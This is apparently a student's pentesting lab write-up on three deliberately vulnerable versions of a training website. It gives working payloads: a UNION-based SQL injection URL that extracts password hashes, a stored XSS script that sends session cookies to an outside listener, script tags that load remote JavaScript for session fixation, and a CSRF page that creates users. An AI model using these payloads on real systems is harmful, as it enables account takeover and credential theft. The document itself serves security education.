# Week-9-Project-Pentesting-Live-Targets

Time spent: 55 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

Vulnerability #1: __SQL Injection__

Description:

Steps to recreate:

* Go to the salespearson page https://104.198.208.81/blue/public/salesperson.php?id=1
* Replace the id parameter with a single quote '.
Example: https://104.198.208.81/blue/public/salesperson.php?id='
* After the quote type url encoded SQL command.
Example: https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Chashed_password+FROM+users+limit+20+offset+2+--+
* You can interate through the records by changing the LIMIT and OFFSET values

Data collected:

* Database: globitek_blue
* Tables:
* users
* territories
* states
* salespeople_territories
* salespeople
* failed_logins
* countries
* feedback
* Columns
* id
* name
* code
* username
* count
* last_attempt
* email
* feedback
* created_at
* first_name
* last_name
* phone
* territory_id
* salesperson_id
* country_id
* state_id
* position
* hashed_password

<img src="blue-vuln1.gif">

Vulnerability #2: __Session Hijacking/ Fixation___

Description:

Steps to recreate:

* When logged in as an admin go to "Countries, States, & Territories".
* Click on "Show", doesn't matter which country.
* Click on "Add a State".
* Enter values for "Name" and "Code" and click create.
* Click on "Add a Territory".
* Ender a value for "Name".
* In the filed "Position" type:
>      <script src="https://bit.ly/2z1UCVh"></script>
* https://bit.ly/2z1UCVh is a shortened link for a js script hosted on GoogeDrive
* Sign in again to the website as an admin
* Now the owner on PHPSESSID hardcoded in js script is logged into the website as an admin
* This is possible because new PHPSESSID is not generated when a used logs into website

<img src="blue-vuln2.gif">

## Green

Vulnerability #1: ____Username Enumeration____

Description:

Steps to recreate:

* On the Log In page try to bruteforce diffent usernames.
* The usernames tha exist in the database will get the message "Log in was unsuccessful" in bald.
* The error message is highlited in bald because a different CSS class is assigned to the error message for usernames that exit in the database.
<img src="green-vuln1.gif">

Vulnerability #2: _____Cross-Site Scripting (XSS)___

Description:

Steps to recreate:

* Go to the Contact page.
* In the text area type the following script
>  <script>var node = document.createElement('img');
>  node.src = "http://192.168.1.2:3000?cookie="+document.cookie;
>  document.getElementById("main-content").appendChild(node);</script>
* Submit the form
* When admin checks the feeedback PHPSESSID will be sent to the http://192.168.1.2:3000 address as a GET parameter

<img src="green-vuln2.gif">


## Red

Vulnerability #1: ____Insecure Direct Object Reference (IDOR)____

Description:

Steps to recreate:

* Go to the "Find a Salesperson" page.
* Click on one of the salespersons page.
* Increment the number at the end of the URL.
> <img src="red-vuln1.gif">

Vulnerability #2: ___Cross-Site Request Forgery (CSRF)_____

Description:

Steps to recreate:

* When logged in as an admin go to http://artemskit.github.io .
* See the code for the page here
* A new user will be created with the username "johnnybravo".
* This is possible because /red/public/staff/users/new.php does not check "csrf_token" in the new user creation form

<img src="red-vuln2.gif">


## Bonus Objective 1:

Build on Objective #3 (SQL Injection). Experiment to see what other kinds of information you can get the database to reveal.
* Collected information about database schema and password hashes as demonstrated in Blue Vulnerability #1: SQL Injection (SQLi)


## Bonus Objective 1:

Build on Objective #4 (Cross-Site Scripting). Experiment to see if you can use XSS to: a) direct the user to a new URL, b) read cookie data, c) set cookie data.
* Read the cookie data as demonstrated in Green Vulnerability #2: Cross-Site Scripting (XSS)
* Can't demonstrate redirect because the Green target's page "Feedback" already redirects to another page.
* Redirects are done through
>    document.location = "URL"
* Set cookie

<img src="red-vuln2.gif">

## Advanced Objective:

Set cookie using XSS
* Can't demonstrate "Set cookie using XSS" through the "Feedback" page because the Green target's "Feedback" page already redirects to another page.
* Demonstrated using XSS in the "Add a Teritory" page.

<img src="red-vuln2.gif">

Steps to recreate:

* When logged in as an admin go to "Countries, States, & Territories".
* Click on "Show", doesn't matter which country.
* Click on "Add a State".
* Enter values for "Name" and "Code" and click create.
* Click on "Add a Territory".
* Ender a value for "Name".
* In the filed "Position" type:
>     <script src="https://bit.ly/2z3GhIf"></script>
>https://bit.ly/2z3GhIf is a shortened link for a js script hosted on GoogeDrive
* The cookie is changed.

## Notes
* Any user can be deleted, which creates a situation where noone can log into the website.
* Any user can use XSS to redirect away from the "Feedback" page, which creates a situation where noone can use this page.


